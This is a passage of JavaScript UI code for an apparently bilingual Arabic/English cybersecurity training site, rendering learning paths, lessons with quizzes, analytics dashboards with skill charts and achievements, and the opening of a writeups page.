              <i class="fa-solid ${intermediate.icon} fa-2x mb-2"></i>
              <h4>${intermediate.title[currentLang] || intermediate.title.ar}</h4>
              <small>${intermediate.duration}</small>
            </div>
            <div class="card-body">
              <p>${intermediate.description[currentLang] || intermediate.description.ar}</p>
              <ul class="list-unstyled">
                <li><i class="fa-solid fa-check text-success"></i> ${intermediate.modules.length} ${txt('وحدات', 'modules')}</li>
                <li><i class="fa-solid fa-check text-success"></i> Web Application Security</li>
                <li><i class="fa-solid fa-check text-success"></i> OWASP Top 10</li>
              </ul>
              <button class="btn btn-${intermediate.color} w-100" onclick="showPathDetails('intermediate')">
                ${txt('ابدأ الآن', 'Start Now')}
              </button>
            </div>
          </div>
        </div>
        
        <!-- Advanced Path -->
        <div class="col-md-4">
          <div class="card border-${advanced.color} h-100 shadow-sm">
            <div class="card-header bg-${advanced.color} text-white text-center">
              <i class="fa-solid ${advanced.icon} fa-2x mb-2"></i>
              <h4>${advanced.title[currentLang] || advanced.title.ar}</h4>
              <small>${advanced.duration}</small>
            </div>
            <div class="card-body">
              <p>${advanced.description[currentLang] || advanced.description.ar}</p>
              <ul class="list-unstyled">
                <li><i class="fa-solid fa-check text-success"></i> ${advanced.modules.length} ${txt('وحدات', 'modules')}</li>
                <li><i class="fa-solid fa-check text-success"></i> Buffer Overflow</li>
                <li><i class="fa-solid fa-check text-success"></i> Red Team Operations</li>
              </ul>
              <button class="btn btn-${advanced.color} w-100" onclick="showPathDetails('advanced')">
                ${txt('ابدأ الآن', 'Start Now')}
              </button>
            </div>
          </div>
        </div>
      </div>
      
      <!-- Path Details Container (Hidden by default) -->
      <div id="path-details-container"></div>
    </div>
    
    <script>
      window.showPathDetails = function(pathId) {
        const path = learningPaths[pathId];
        if (!path) return;
        
        // Hide the path selection cards
        document.querySelector('.row.g-4.mb-5').style.display = 'none';
        
        const container = document.getElementById('path-details-container');
        let html = \`
          <div class="card border-\${path.color} mb-4">
            <div class="card-header bg-\${path.color} \${pathId === 'intermediate' ? 'text-dark' : 'text-white'}">
              <h3><i class="fa-solid \${path.icon}"></i> \${path.title[currentLang] || path.title.ar}</h3>
            </div>
            <div class="card-body">
        \`;
        
        // Render modules
        path.modules.forEach((module, index) => {
          html += \`
            <div class="card mb-3">
              <div class="card-header bg-light">
                <h5><i class="fa-solid fa-book"></i> ${txt('الوحدة', 'Module')} \${module.id}: \${module.title[currentLang] || module.title.ar}</h5>
                <small class="text-muted"><i class="fa-solid fa-clock"></i> \${module.duration}</small>
              </div>
              <div class="card-body">
                <p>\${module.description[currentLang] || module.description.ar}</p>
                
                \${module.lessons ? \`
                  <h6 class="mt-3">${txt('الدروس:', 'Lessons:')}</h6>
                  <div class="list-group mb-3">
                    \${module.lessons.map(lesson => \`
                      <a href="#" class="list-group-item list-group-item-action" onclick="showLesson('\${pathId}', \${module.id}, \${lesson.id}); return false;">
                        <i class="fa-solid fa-play-circle"></i> \${lesson.title[currentLang] || lesson.title.ar}
                      </a>
                    \`).join('')}
                  </div>
                \` : ''}
                
                \${module.topics ? \`
                  <h6 class="mt-3">${txt('المواضيع:', 'Topics:')}</h6>
                  <ul class="small">
                    \${module.topics.map(topic => \`<li>\${topic[currentLang] || topic.ar}</li>\`).join('')}
                  </ul>
                \` : ''}
                
                \${module.externalResources ? \`
                  <h6 class="mt-3"><i class="fa-solid fa-link"></i> ${txt('مصادر خارجية:', 'External Resources:')}</h6>
                  <div class="list-group">
                    \${module.externalResources.map(resource => \`
                      <a href="\${resource.url}" target="_blank" class="list-group-item list-group-item-action">
                        <i class="fa-solid \${resource.icon || 'fa-link'}"></i> \${resource.title[currentLang] || resource.title.ar}
                        \${resource.description ? \`<br><small class="text-muted">\${resource.description[currentLang] || resource.description.ar}</small>\` : ''}
                      </a>
                    \`).join('')}
                  </div>
                \` : ''}
              </div>
            </div>
          \`;
        });
        
        html += \`
            </div>
          </div>
        \`;
        
        container.innerHTML = html;
        container.scrollIntoView({ behavior: 'smooth' });
      }
      
      window.showLesson = function(pathId, moduleId, lessonId) {
        const path = learningPaths[pathId];
        const module = path.modules.find(m => m.id === moduleId);
        const lesson = module.lessons.find(l => l.id === lessonId);
        
        if (!lesson) return;
        
        const container = document.getElementById('path-details-container');
        const content = lesson.content[currentLang] || lesson.content.ar;
        
        container.innerHTML = \`
          <div class="card mb-4">
            <div class="card-header bg-primary text-white">
              <h4>\${lesson.title[currentLang] || lesson.title.ar}</h4>
              <button class="btn btn-sm btn-light float-end" onclick="showPathDetails('\${pathId}')">
                <i class="fa-solid fa-arrow-left"></i> ${txt('رجوع', 'Back')}
              </button>
            </div>
            <div class="card-body">
              <div class="lesson-content">
                \${marked ? marked.parse(content) : content.replace(/\\n/g, '<br>')}
              </div>
              
              \${lesson.labFile ? \`
                <div class="alert alert-info mt-4">
                  <h5><i class="fa-solid fa-flask"></i> ${txt('تطبيق عملي', 'Practical Lab')}</h5>
                  <p>${txt('هذا الدرس يحتوي على مختبر عملي تفاعلي. جربه الآن!', 'This lesson includes an interactive practical lab. Try it now!')}</p>
                  <button class="btn btn-success w-100" onclick="openEducationContent('\${lesson.labFile.replace('-education.html', '')}')">
                    <i class="fa-solid fa-rocket"></i> ${txt('ابدأ المختبر العملي', 'Start Interactive Lab')}
                  </button>
                </div>
              \` : ''}
              
              \${module.quiz ? \`
                <div class="mt-4">
                  <h5>${txt('اختبر فهمك:', 'Test Your Understanding:')}</h5>
                  <div id="quiz-container">
                    \${module.quiz.map((q, i) => \`
                      <div class="card mb-3">
                        <div class="card-body">
                          <p><strong>\${i + 1}. \${q.question[currentLang] || q.question.ar}</strong></p>
                          <div class="btn-group-vertical w-100" role="group">
                            \${q.options.map((opt, optIndex) => \`
                              <button class="btn btn-outline-primary text-start" onclick="checkQuizAnswer(\${i}, \${optIndex}, \${q.correct})">
                                \${opt[currentLang] || opt.ar}
                              </button>
                            \`).join('')}
                          </div>
                          <div id="quiz-feedback-\${i}" class="mt-2"></div>
                        </div>
                      </div>
                    \`).join('')}
                  </div>
                </div>
              \` : ''}
            </div>
          </div>
        \`;
        
        container.scrollIntoView({ behavior: 'smooth' });
      }
      
      window.resetPathView = function() {
        // Show the path selection cards again
        const pathCards = document.querySelector('.row.g-4.mb-5');
        if (pathCards) pathCards.style.display = 'flex';
        
        // Clear the details container
        document.getElementById('path-details-container').innerHTML = '';
        
        // Scroll to top
        window.scrollTo({ top: 0, behavior: 'smooth' });
      }
      
      window.checkQuizAnswer = function(questionIndex, selectedIndex, correctIndex) {
        const feedback = document.getElementById(\`quiz-feedback-\${questionIndex}\`);
        if (selectedIndex === correctIndex) {
          feedback.innerHTML = '<div class="alert alert-success"><i class="fa-solid fa-check"></i> ${txt('إجابة صحيحة!', 'Correct!')}</div>';
          addXP(10);
        } else {
          feedback.innerHTML = '<div class="alert alert-danger"><i class="fa-solid fa-times"></i> ${txt('إجابة خاطئة، حاول مرة أخرى', 'Incorrect, try again')}</div>';
        }
      }
    </script>
  `;
}

function pageDashboardOld() {
  const analytics = window.analyticsManager?.getData() || {
    totalChallenges: 0,
    completedChallenges: 0,
    totalPoints: 0,
    currentStreak: 0,
    skillLevels: { web: 0, crypto: 0, forensics: 0, osint: 0, network: 0 },
    achievements: []
  };

  const levelInfo = window.analyticsManager?.getLevel() || { level: 1, name: 'Newbie', next: 100 };
  const levelProgress = Math.min(100, Math.round((analytics.totalPoints / (levelInfo.next || analytics.totalPoints)) * 100));
  const recentActivity = window.analyticsManager?.getRecentActivity() || [];
  const weaknesses = window.analyticsManager?.getWeaknesses() || [];
  const strengths = window.analyticsManager?.getStrengths() || [];

  return `
    <div class="container-fluid mt-4">
      <style>
        .analytics-hero {
          background: linear-gradient(135deg, #1a1c23 0%, #12141a 100%);
          color: white;
          padding: 40px 20px;
          border-radius: 20px;
          margin-bottom: 30px;
          position: relative;
          overflow: hidden;
        }
        .stat-card {
          background: white;
          border-radius: 15px;
          padding: 25px;
          box-shadow: 0 4px 6px rgba(0,0,0,0.05);
          height: 100%;
          transition: transform 0.3s ease;
        }
        .stat-card:hover { 
          transform: translateY(-5px); 
        }
        .stat-value {
          font-size: 2.5rem;
          font-weight: 800;
          margin: 10px 0;
        }
        .stat-label {
          color: #6c757d;
          font-size: 0.9rem;
          text-transform: uppercase;
          letter-spacing: 1px;
        }
        .chart-container {
          background: white;
          border-radius: 15px;
          padding: 25px;
          box-shadow: 0 4px 6px rgba(0,0,0,0.05);
          height: 100%;
        }
        .level-badge {
          background: rgba(255,255,255,0.1);
          padding: 5px 15px;
          border-radius: 20px;
          backdrop-filter: blur(5px);
          display: inline-block;
        }
        .progress-bar-custom {
          width: 100%;
          height: 30px;
          border-radius: 15px;
          background: #e9ecef;
          overflow: hidden;
        }
        .progress-fill {
          height: 100%;
          background: linear-gradient(90deg, #667eea, #764ba2);
          border-radius: 15px;
          transition: width 1s ease;
          display: flex;
          align-items: center;
          justify-content: center;
          color: white;
          font-weight: bold;
        }
        .skill-bar {
          height: 20px;
          background: #e9ecef;
          border-radius: 10px;
          overflow: hidden;
          margin: 10px 0;
        }
        .skill-fill {
          height: 100%;
          border-radius: 10px;
          transition: width 1s ease;
        }
        .weakness-card {
          background: #fff3cd;
          border-left: 4px solid #ffc107;
          padding: 15px;
          border-radius: 8px;
          margin-bottom: 10px;
        }
         .strength-card {
          background: #d4edda;
          border-left: 4px solid #28a745;
          padding: 15px;
          border-radius: 8px;
          margin-bottom: 10px;
        }
      </style>

      <!-- Hero Section -->
      <div class="analytics-hero text-center">
        <div class="container" style="position: relative; z-index: 1;">
          <h1 class="display-4 fw-bold mb-3">
            <i class="fa-solid fa-chart-line me-3"></i>
            ${txt('لوحة التحليلات', 'Analytics Dashboard')}
          </h1>
          <p class="lead mb-4" style="opacity: 0.95;">
            ${txt('تتبع تقدمك وحلل أداءك في رحلتك التعليمية', 'Track your progress and analyze your performance in your learning journey')}
          </p>
          
          <!-- Level Info -->
          <div class="mb-4">
            <span class="level-badge">
              <i class="fa-solid fa-star me-2"></i>
              ${txt('المستوى', 'Level')} ${levelInfo.level} - ${levelInfo.name}
            </span>
          </div>
          
          <!-- Level Progress -->
          <div class="progress-bar-custom mx-auto" style="max-width: 600px;">
            <div class="progress-fill" style="width: ${levelProgress}%;">
              ${levelProgress}%
            </div>
          </div>
          ${levelInfo.next ? `
            <small class="d-block mt-2" style="opacity: 0.8;">
              ${analytics.totalPoints} / ${levelInfo.next} ${txt('نقطة للمستوى التالي', 'points to next level')}
            </small>
          ` : ''}
        </div>
      </div>

      <div class="container">
        <!-- Statistics Cards -->
        <div class="row g-4 mb-4">
          <div class="col-md-3">
            <div class="stat-card text-center">
              <i class="fa-solid fa-trophy text-warning" style="font-size: 3rem;"></i>
              <div class="stat-value text-warning">${analytics.totalPoints}</div>
              <div class="stat-label">${txt('إجمالي النقاط', 'Total Points')}</div>
            </div>
          </div>
          
          <div class="col-md-3">
            <div class="stat-card text-center">
              <i class="fa-solid fa-check-circle text-success" style="font-size: 3rem;"></i>
              <div class="stat-value text-success">${analytics.completedChallenges}</div>
              <div class="stat-label">${txt('تحديات مكتملة', 'Completed Challenges')}</div>
            </div>
          </div>
          
          <div class="col-md-3">
            <div class="stat-card text-center">
              <i class="fa-solid fa-fire text-danger" style="font-size: 3rem;"></i>
              <div class="stat-value text-danger">${analytics.currentStreak}</div>
              <div class="stat-label">${txt('أيام متتالية', 'Day Streak')}</div>
            </div>
          </div>
          
          <div class="col-md-3">
            <div class="stat-card text-center">
              <i class="fa-solid fa-medal text-info" style="font-size: 3rem;"></i>
              <div class="stat-value text-info">${analytics.achievements.length}</div>
              <div class="stat-label">${txt('إنجازات', 'Achievements')}</div>
            </div>
          </div>
        </div>

        <!-- Skill Levels -->
        <div class="row g-4 mb-4">
          <div class="col-lg-6">
            <div class="chart-container">
              <h4 class="mb-4">
                <i class="fa-solid fa-chart-radar text-primary me-2"></i>
                ${txt('مستويات المهارات', 'Skill Levels')}
              </h4>
              <canvas id="skillRadarChart" width="400" height="400"></canvas>
            </div>
          </div>
          
          <div class="col-lg-6">
            <div class="chart-container">
              <h4 class="mb-4">
                <i class="fa-solid fa-signal text-success me-2"></i>
                ${txt('تفصيل المهارات', 'Skill Breakdown')}
              </h4>
              ${Object.entries(analytics.skillLevels).map(([skill, level]) => `
                <div class="mb-3">
                  <div class="d-flex justify-content-between mb-1">
                    <span class="text-capitalize">${skill}</span>
                    <span class="fw-bold">${Math.round(level)}%</span>
                  </div>
                  <div class="skill-bar">
                    <div class="skill-fill" style="width: ${level}%; background: linear-gradient(90deg, ${skill === 'web' ? '#667eea, #764ba2' :
      skill === 'crypto' ? '#f093fb, #f5576c' :
        skill === 'forensics' ? '#4facfe, #00f2fe' :
          skill === 'osint' ? '#43e97b, #38f9d7' :
            '#fa709a, #fee140'
    });"></div>
                  </div>
                </div>
              `).join('')}
            </div>
          </div>
        </div>

        <!-- Recent Activity & Insights -->
        <div class="row g-4 mb-4">
          <div class="col-lg-6">
            <div class="chart-container">
              <h4 class="mb-4">
                <i class="fa-solid fa-clock-rotate-left text-info me-2"></i>
                ${txt('النشاط الأخير', 'Recent Activity')}
              </h4>
              ${recentActivity.length > 0 ? recentActivity.slice(0, 5).map(activity => `
                <div class="activity-item">
                  <div class="d-flex justify-content-between align-items-center">
                    <div>
                      <strong>${activity.challengeId}</strong>
                      <span class="badge bg-primary ms-2">${activity.category}</span>
                    </div>
                    <div class="text-end">
                      <div class="text-success fw-bold">+${activity.points} pts</div>
                      <small class="text-muted">${new Date(activity.timestamp).toLocaleDateString()}</small>
                    </div>
                  </div>
                </div>
              `).join('') : `
                <div class="text-center text-muted py-5">
                  <i class="fa-solid fa-inbox fa-3x mb-3"></i>
                  <p>${txt('لا يوجد نشاط حديث', 'No recent activity')}</p>
                </div>
              `}
            </div>
          </div>
          
          <div class="col-lg-6">
            <div class="chart-container">
              <h4 class="mb-4">
                <i class="fa-solid fa-lightbulb text-warning me-2"></i>
                ${txt('رؤى وتوصيات', 'Insights & Recommendations')}
              </h4>
              
              ${strengths.length > 0 ? `
                <h6 class="text-success mb-3">
                  <i class="fa-solid fa-thumbs-up me-2"></i>
                  ${txt('نقاط القوة', 'Strengths')}
                </h6>
                ${strengths.slice(0, 2).map(s => `
                  <div class="strength-card">
                    <strong class="text-capitalize">${s.category}</strong>
                    <div class="small">${Math.round(s.completionRate)}% ${txt('معدل الإكمال', 'completion rate')}</div>
                  </div>
                `).join('')}
              ` : ''}
              
              ${weaknesses.length > 0 ? `
                <h6 class="text-warning mb-3 mt-4">
                  <i class="fa-solid fa-exclamation-triangle me-2"></i>
                  ${txt('مجالات للتحسين', 'Areas to Improve')}
                </h6>
                ${weaknesses.slice(0, 2).map(w => `
                  <div class="weakness-card">
                    <strong class="text-capitalize">${w.category}</strong>
                    <div class="small">${txt('ركز على هذا المجال لتحسين مهاراتك', 'Focus on this area to improve your skills')}</div>
                  </div>
                `).join('')}
              ` : ''}
              
              ${strengths.length === 0 && weaknesses.length === 0 ? `
                <div class="text-center text-muted py-4">
                  <p>${txt('أكمل المزيد من التحديات للحصول على رؤى', 'Complete more challenges to get insights')}</p>
                </div>
              ` : ''}
            </div>
          </div>
        </div>

        <!-- Achievements -->
        ${analytics.achievements.length > 0 ? `
          <div class="chart-container mb-4">
            <h4 class="mb-4">
              <i class="fa-solid fa-award text-warning me-2"></i>
              ${txt('الإنجازات المفتوحة', 'Unlocked Achievements')}
            </h4>
            <div class="text-center">
              ${analytics.achievements.map(achId => {
      const achievements = {
        first_blood: { name: 'First Blood', icon: 'fa-flag' },
        beginner: { name: 'Beginner', icon: 'fa-seedling' },
        intermediate: { name: 'Intermediate', icon: 'fa-fire' },
        expert: { name: 'Expert', icon: 'fa-crown' },
        streak_7: { name: '7 Day Streak', icon: 'fa-calendar-check' },
        streak_30: { name: '30 Day Streak', icon: 'fa-fire-flame-curved' },
        point_hunter: { name: 'Point Hunter', icon: 'fa-trophy' },
        web_master: { name: 'Web Master', icon: 'fa-globe' },
        crypto_expert: { name: 'Crypto Expert', icon: 'fa-key' }
      };
      const ach = achievements[achId];
      return ach ? `
                  <span class="achievement-badge">
                    <i class="fa-solid ${ach.icon} me-2"></i>
                    ${ach.name}
                  </span>
                ` : '';
    }).join('')}
            </div>
          </div>
        ` : ''}
      </div>
    </div>

    <script>
      // Render Skill Radar Chart
      setTimeout(() => {
        const ctx = document.getElementById('skillRadarChart');
        if (ctx && typeof Chart !== 'undefined') {
          new Chart(ctx, {
            type: 'radar',
            data: {
              labels: ['Web', 'Crypto', 'Forensics', 'OSINT', 'Network'],
              datasets: [{
                label: '${txt('مستوى المهارة', 'Skill Level')}',
                data: [
                  ${analytics.skillLevels.web},
                  ${analytics.skillLevels.crypto},
                  ${analytics.skillLevels.forensics},
                  ${analytics.skillLevels.osint},
                  ${analytics.skillLevels.network}
                ],
                backgroundColor: 'rgba(102, 126, 234, 0.2)',
                borderColor: 'rgba(102, 126, 234, 1)',
                borderWidth: 2,
                pointBackgroundColor: 'rgba(102, 126, 234, 1)',
                pointBorderColor: '#fff',
                pointHoverBackgroundColor: '#fff',
                pointHoverBorderColor: 'rgba(102, 126, 234, 1)'
              }]
            },
            options: {
              scales: {
                r: {
                  beginAtZero: true,
                  max: 100,
                  ticks: {
                    stepSize: 20
                  }
                }
              },
              plugins: {
                legend: {
                  display: false
                }
              }
            }
          });
        }
      }, 500);
    </script>
  `;
}

// ==================== ANALYTICS DASHBOARD ====================
function pageAnalytics() {
  const analytics = window.analyticsManager?.getData() || {
    totalChallenges: 0,
    completedChallenges: 0,
    totalPoints: 0,
    currentStreak: 0,
    skillLevels: { web: 0, crypto: 0, forensics: 0, osint: 0, network: 0 },
    achievements: []
  };

  const levelInfo = window.analyticsManager?.getLevel() || { level: 1, name: 'Newbie', next: 100 };
  const levelProgress = window.analyticsManager?.getLevelProgress() || 0;
  const recentActivity = window.analyticsManager?.getRecentActivity() || [];
  const weaknesses = window.analyticsManager?.getWeaknesses() || [];
  const strengths = window.analyticsManager?.getStrengths() || [];

  return `
    <div class="container-fluid mt-4">
      <style>
        .analytics-hero {
          background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
          color: white;
          padding: 60px 20px;
          border-radius: 20px;
          margin-bottom: 40px;
          position: relative;
          overflow: hidden;
        }
        .analytics-hero::before {
          content: '';
          position: absolute;
          top: -50%;
          right: -50%;
          width: 200%;
          height: 200%;
          background: radial-gradient(circle, rgba(255,255,255,0.1) 0%, transparent 70%);
          animation: rotate 20s linear infinite;
        }
        .stat-card {
          background: white;
          border-radius: 15px;
          padding: 25px;
          box-shadow: 0 4px 15px rgba(0,0,0,0.1);
          transition: all 0.3s ease;
          height: 100%;
        }
        .stat-card:hover {
          transform: translateY(-5px);
          box-shadow: 0 8px 25px rgba(0,0,0,0.15);
        }
        .stat-value {
          font-size: 2.5rem;
          font-weight: bold;
          margin: 10px 0;
        }
        .stat-label {
          color: #6c757d;
          font-size: 0.9rem;
          text-transform: uppercase;
          letter-spacing: 1px;
        }
        .chart-container {
          background: white;
          border-radius: 15px;
          padding: 30px;
          box-shadow: 0 4px 15px rgba(0,0,0,0.1);
          height: 100%;
        }
        .activity-item {
          padding: 15px;
          border-left: 3px solid #667eea;
          margin-bottom: 15px;
          background: #f8f9fa;
          border-radius: 8px;
          transition: all 0.3s ease;
        }
        .activity-item:hover {
          background: #e9ecef;
          transform: translateX(5px);
        }
        .achievement-badge {
          display: inline-block;
          padding: 10px 20px;
          border-radius: 25px;
          background: linear-gradient(135deg, #ffd700, #ffed4e);
          color: #000;
          font-weight: bold;
          margin: 5px;
          box-shadow: 0 4px 10px rgba(255, 215, 0, 0.3);
        }
        .level-badge {
          display: inline-block;
          padding: 8px 20px;
          border-radius: 20px;
          background: linear-gradient(135deg, #00d9ff, #6c5ce7);
          color: white;
          font-weight: bold;
          font-size: 1.1rem;
        }
        .progress-bar-custom {
          height: 30px;
          border-radius: 15px;
          background: #e9ecef;
          overflow: hidden;
        }
        .progress-fill {
          height: 100%;
          background: linear-gradient(90deg, #667eea, #764ba2);
          border-radius: 15px;
          transition: width 1s ease;
          display: flex;
          align-items: center;
          justify-content: center;
          color: white;
          font-weight: bold;
        }
        .skill-bar {
          height: 20px;
          background: #e9ecef;
          border-radius: 10px;
          overflow: hidden;
          margin: 10px 0;
        }
        .skill-fill {
          height: 100%;
          border-radius: 10px;
          transition: width 1s ease;
        }
        .weakness-card {
          background: #fff3cd;
          border-left: 4px solid #ffc107;
          padding: 15px;
          border-radius: 8px;
          margin-bottom: 10px;
        }
        .strength-card {
          background: #d4edda;
          border-left: 4px solid #28a745;
          padding: 15px;
          border-radius: 8px;
          margin-bottom: 10px;
        }
      </style>

      <!-- Hero Section -->
      <div class="analytics-hero text-center">
        <div class="container" style="position: relative; z-index: 1;">
          <h1 class="display-4 fw-bold mb-3">
            <i class="fa-solid fa-chart-line me-3"></i>
            ${txt('لوحة التحليلات', 'Analytics Dashboard')}
          </h1>
          <p class="lead mb-4" style="opacity: 0.95;">
            ${txt('تتبع تقدمك وحلل أداءك في رحلتك التعليمية', 'Track your progress and analyze your performance in your learning journey')}
          </p>
          
          <!-- Level Info -->
          <div class="mb-4">
            <span class="level-badge">
              <i class="fa-solid fa-star me-2"></i>
              ${txt('المستوى', 'Level')} ${levelInfo.level} - ${levelInfo.name}
            </span>
          </div>
          
          <!-- Level Progress -->
          <div class="progress-bar-custom mx-auto" style="max-width: 600px;">
            <div class="progress-fill" style="width: ${levelProgress}%;">
              ${levelProgress}%
            </div>
          </div>
          ${levelInfo.next ? `
            <small class="d-block mt-2" style="opacity: 0.8;">
              ${analytics.totalPoints} / ${levelInfo.next} ${txt('نقطة للمستوى التالي', 'points to next level')}
            </small>
          ` : ''}
        </div>
      </div>

      <div class="container">
        <!-- Statistics Cards -->
        <div class="row g-4 mb-4">
          <div class="col-md-3">
            <div class="stat-card text-center">
              <i class="fa-solid fa-trophy text-warning" style="font-size: 3rem;"></i>
              <div class="stat-value text-warning">${analytics.totalPoints}</div>
              <div class="stat-label">${txt('إجمالي النقاط', 'Total Points')}</div>
            </div>
          </div>
          
          <div class="col-md-3">
            <div class="stat-card text-center">
              <i class="fa-solid fa-check-circle text-success" style="font-size: 3rem;"></i>
              <div class="stat-value text-success">${analytics.completedChallenges}</div>
              <div class="stat-label">${txt('تحديات مكتملة', 'Completed Challenges')}</div>
            </div>
          </div>
          
          <div class="col-md-3">
            <div class="stat-card text-center">
              <i class="fa-solid fa-fire text-danger" style="font-size: 3rem;"></i>
              <div class="stat-value text-danger">${analytics.currentStreak}</div>
              <div class="stat-label">${txt('أيام متتالية', 'Day Streak')}</div>
            </div>
          </div>
          
          <div class="col-md-3">
            <div class="stat-card text-center">
              <i class="fa-solid fa-medal text-info" style="font-size: 3rem;"></i>
              <div class="stat-value text-info">${analytics.achievements.length}</div>
              <div class="stat-label">${txt('إنجازات', 'Achievements')}</div>
            </div>
          </div>
        </div>

        <!-- Skill Levels -->
        <div class="row g-4 mb-4">
          <div class="col-lg-6">
            <div class="chart-container">
              <h4 class="mb-4">
                <i class="fa-solid fa-chart-radar text-primary me-2"></i>
                ${txt('مستويات المهارات', 'Skill Levels')}
              </h4>
              <canvas id="skillRadarChart" width="400" height="400"></canvas>
            </div>
          </div>
          
          <div class="col-lg-6">
            <div class="chart-container">
              <h4 class="mb-4">
                <i class="fa-solid fa-signal text-success me-2"></i>
                ${txt('تفصيل المهارات', 'Skill Breakdown')}
              </h4>
              ${Object.entries(analytics.skillLevels).map(([skill, level]) => `
                <div class="mb-3">
                  <div class="d-flex justify-content-between mb-1">
                    <span class="text-capitalize">${skill}</span>
                    <span class="fw-bold">${Math.round(level)}%</span>
                  </div>
                  <div class="skill-bar">
                    <div class="skill-fill" style="width: ${level}%; background: linear-gradient(90deg, ${skill === 'web' ? '#667eea, #764ba2' :
      skill === 'crypto' ? '#f093fb, #f5576c' :
        skill === 'forensics' ? '#4facfe, #00f2fe' :
          skill === 'osint' ? '#43e97b, #38f9d7' :
            '#fa709a, #fee140'
    });"></div>
                  </div>
                </div>
              `).join('')}
            </div>
          </div>
        </div>

        <!-- Recent Activity & Insights -->
        <div class="row g-4 mb-4">
          <div class="col-lg-6">
            <div class="chart-container">
              <h4 class="mb-4">
                <i class="fa-solid fa-clock-rotate-left text-info me-2"></i>
                ${txt('النشاط الأخير', 'Recent Activity')}
              </h4>
              ${recentActivity.length > 0 ? recentActivity.slice(0, 5).map(activity => `
                <div class="activity-item">
                  <div class="d-flex justify-content-between align-items-center">
                    <div>
                      <strong>${activity.challengeId}</strong>
                      <span class="badge bg-primary ms-2">${activity.category}</span>
                    </div>
                    <div class="text-end">
                      <div class="text-success fw-bold">+${activity.points} pts</div>
                      <small class="text-muted">${new Date(activity.timestamp).toLocaleDateString()}</small>
                    </div>
                  </div>
                </div>
              `).join('') : `
                <div class="text-center text-muted py-5">
                  <i class="fa-solid fa-inbox fa-3x mb-3"></i>
                  <p>${txt('لا يوجد نشاط حديث', 'No recent activity')}</p>
                </div>
              `}
            </div>
          </div>
          
          <div class="col-lg-6">
            <div class="chart-container">
              <h4 class="mb-4">
                <i class="fa-solid fa-lightbulb text-warning me-2"></i>
                ${txt('رؤى وتوصيات', 'Insights & Recommendations')}
              </h4>
              
              ${strengths.length > 0 ? `
                <h6 class="text-success mb-3">
                  <i class="fa-solid fa-thumbs-up me-2"></i>
                  ${txt('نقاط القوة', 'Strengths')}
                </h6>
                ${strengths.slice(0, 2).map(s => `
                  <div class="strength-card">
                    <strong class="text-capitalize">${s.category}</strong>
                    <div class="small">${Math.round(s.completionRate)}% ${txt('معدل الإكمال', 'completion rate')}</div>
                  </div>
                `).join('')}
              ` : ''}
              
              ${weaknesses.length > 0 ? `
                <h6 class="text-warning mb-3 mt-4">
                  <i class="fa-solid fa-exclamation-triangle me-2"></i>
                  ${txt('مجالات للتحسين', 'Areas to Improve')}
                </h6>
                ${weaknesses.slice(0, 2).map(w => `
                  <div class="weakness-card">
                    <strong class="text-capitalize">${w.category}</strong>
                    <div class="small">${txt('ركز على هذا المجال لتحسين مهاراتك', 'Focus on this area to improve your skills')}</div>
                  </div>
                `).join('')}
              ` : ''}
              
              ${strengths.length === 0 && weaknesses.length === 0 ? `
                <div class="text-center text-muted py-4">
                  <p>${txt('أكمل المزيد من التحديات للحصول على رؤى', 'Complete more challenges to get insights')}</p>
                </div>
              ` : ''}
            </div>
          </div>
        </div>

        <!-- Achievements -->
        ${analytics.achievements.length > 0 ? `
          <div class="chart-container mb-4">
            <h4 class="mb-4">
              <i class="fa-solid fa-award text-warning me-2"></i>
              ${txt('الإنجازات المفتوحة', 'Unlocked Achievements')}
            </h4>
            <div class="text-center">
              ${analytics.achievements.map(achId => {
      const achievements = {
        first_blood: { name: 'First Blood', icon: 'fa-flag' },
        beginner: { name: 'Beginner', icon: 'fa-seedling' },
        intermediate: { name: 'Intermediate', icon: 'fa-fire' },
        expert: { name: 'Expert', icon: 'fa-crown' },
        streak_7: { name: '7 Day Streak', icon: 'fa-calendar-check' },
        streak_30: { name: '30 Day Streak', icon: 'fa-fire-flame-curved' },
        point_hunter: { name: 'Point Hunter', icon: 'fa-trophy' },
        web_master: { name: 'Web Master', icon: 'fa-globe' },
        crypto_expert: { name: 'Crypto Expert', icon: 'fa-key' }
      };
      const ach = achievements[achId];
      return ach ? `
                  <span class="achievement-badge">
                    <i class="fa-solid ${ach.icon} me-2"></i>
                    ${ach.name}
                  </span>
                ` : '';
    }).join('')}
            </div>
          </div>
        ` : ''}
      </div>
    </div>

    <script>
      // Render Skill Radar Chart
      setTimeout(() => {
        const ctx = document.getElementById('skillRadarChart');
        if (ctx && typeof Chart !== 'undefined') {
          new Chart(ctx, {
            type: 'radar',
            data: {
              labels: ['Web', 'Crypto', 'Forensics', 'OSINT', 'Network'],
              datasets: [{
                label: '${txt('مستوى المهارة', 'Skill Level')}',
                data: [
                  ${analytics.skillLevels.web},
                  ${analytics.skillLevels.crypto},
                  ${analytics.skillLevels.forensics},
                  ${analytics.skillLevels.osint},
                  ${analytics.skillLevels.network}
                ],
                backgroundColor: 'rgba(102, 126, 234, 0.2)',
                borderColor: 'rgba(102, 126, 234, 1)',
                borderWidth: 2,
                pointBackgroundColor: 'rgba(102, 126, 234, 1)',
                pointBorderColor: '#fff',
                pointHoverBackgroundColor: '#fff',
                pointHoverBorderColor: 'rgba(102, 126, 234, 1)'
              }]
            },
            options: {
              scales: {
                r: {
                  beginAtZero: true,
                  max: 100,
                  ticks: {
                    stepSize: 20
                  }
                }
              },
              plugins: {
                legend: {
                  display: false
                }
              }
            }
          });
        }
      }, 500);
    </script>
  `;
}

// ==================== WRITEUPS SYSTEM ====================
function pageWriteups() {
  const allWriteups = typeof writeups !== 'undefined' ? writeups : [];

  return `
    <div class="container-fluid mt-4">
      <style>
        .writeups-hero {
          background: linear-gradient(135deg, #00d9ff 0%, #6c5ce7 100%);
          color: white;
          padding: 60px 20px;
          border-radius: 20px;
          margin-bottom: 40px;
          position: relative;
          overflow: hidden;
        }
        .writeup-card {
          background: white;
          border-radius: 15px;
          padding: 25px;
          margin-bottom: 20px;
          box-shadow: 0 4px 15px rgba(0,0,0,0.1);
          transition: all 0.3s ease;
          cursor: pointer;
        }
        .writeup-card:hover {
          transform: translateY(-5px);
          box-shadow: 0 8px 25px rgba(0,0,0,0.15);
        }
        .writeup-meta {
          display: flex;
          gap: 15px;
          flex-wrap: wrap;
          margin-top: 15px;
          font-size: 0.9rem;
          color: #6c757d;
        }
        .writeup-tag {
          display: inline-block;
          padding: 5px 12px;
          background: #e9ecef;
          border-radius: 15px;
          font-size: 0.85rem;
          margin: 3px;
        }
        .rating-stars {
          color: #ffc107;
        }
